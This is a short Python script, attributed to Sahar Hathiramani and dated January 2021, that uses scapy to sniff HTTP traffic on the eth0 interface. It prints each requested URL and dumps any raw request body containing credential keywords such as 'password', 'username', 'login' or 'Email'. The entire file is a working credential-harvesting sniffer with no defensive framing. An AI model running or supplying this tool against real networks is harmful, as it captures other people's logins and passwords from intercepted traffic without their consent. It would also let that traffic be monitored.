#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/19/2021

import scapy.all as scapy
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print('URL: ' + url.decode())
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for i in words:
                if i in str(load):
                    print('Load: ' + load.decode())
                    break



words = ["password", "user", "username", "login", "pass", "Username", "Password", "User", "Email"]
sniff("eth0")
